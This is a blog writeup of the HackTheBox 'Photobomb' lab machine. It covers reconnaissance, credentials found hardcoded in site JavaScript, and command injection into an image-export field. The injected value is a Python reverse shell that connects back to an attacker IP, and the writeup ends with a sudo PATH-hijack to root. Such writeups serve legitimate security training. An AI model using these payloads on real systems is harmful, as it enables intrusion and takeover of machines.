---
layout: post
title: HackTheBox Photobomb Writeup
# subtitle: There's lots to learn!
gh-repo: github.com/thirt33n/thirt33n.github.io
gh-badge: [star, fork, follow]
tags: [htb,writeup]
comments: true
---



## Photobomb
![Photobomb](../assets/img/Photobomb.png){: .mx-auto.d-block :}

We are provided the ip,
```
IP: 10.129.54.72
```
running an nmap scan using the command 

```bash
nmap -sC -sV 10.129.54.72
```
nmap scan :
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 22:00 EDT
Nmap scan report for 10.129.54.72
Host is up (0.61s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.78 seconds
```
<br>

Opening the website after adding *photobomb.htb* in */etc/hosts* file


going to photobomb.htb/login shows this:

```html
Sinatra doesn’t know this ditty.
Try this:

get '/login' do
  "Hello World"
end
```
Turns out :
Sinatra is a minimalist Ruby framework for building server-side web applications. It is neither as popular nor as high-powered as Rails. However, Sinatra is a great tool for learning about routing because we'll manually create all our routes in a file namedapp.rb. Rails will mostly handle routing for us, which means Rails isn't as helpful for understanding this essential concept.

We come back to this later:

Trying a dirb scan on photobomb.htb:
Nothing useful so far, and better not to pursue further.


Now,
a link for http://photobomb.htb/printer is present on the home page:
the page asks for username and pwd for it 

the photobomb.js file shows this :

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
from the snippet above: i used the link given and it allowed me to login as the user  pHOt0:
http://pH0t0:b0Mb!@photobomb.htb/printer

and now i am in the website as a user!

<br>


Also pH0t0:b0Mb! is a user for photobomb.htb

We use  the python reverse shell payload using:

https://www.revshells.com

using the python3 #1 shell

first set up nc listener on port 9001
```bash
nc -lnvp 9001
```
Using burpsuite we intercept the request

and input it into the photo field of the burp proxy(send it to repeater)
the entire request looks like :

```
POST /printer HTTP/1.1
Host: pH0t0:b0Mb!@photobomb.htb
Content-Length: 292
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;export RHOST="10.10.16.11";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'&dimensions=30x20
```
forward it !
```
the response:
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 09 Oct 2022 03:27:55 GMT
Content-Type: text/html
Content-Length: 154
Connection: close
Location: http://photobomb.htb/

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```
this will spawn a reverse shell in the listener

go in and find the user.txt in the home file 
the flag was : [REDACTED]

sub user flag !
user pwned



## Root own

once in check sudo -l:
```bash
$ sudo -l

Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc


cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

since cleanup.sh references other files, we add bash into the find command and then gain root access
```bash
$ echo bash > find
$ chmod +x find
$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
whoami
root
```


then find the root.txt at the root folder

[REDACTED]

pwned

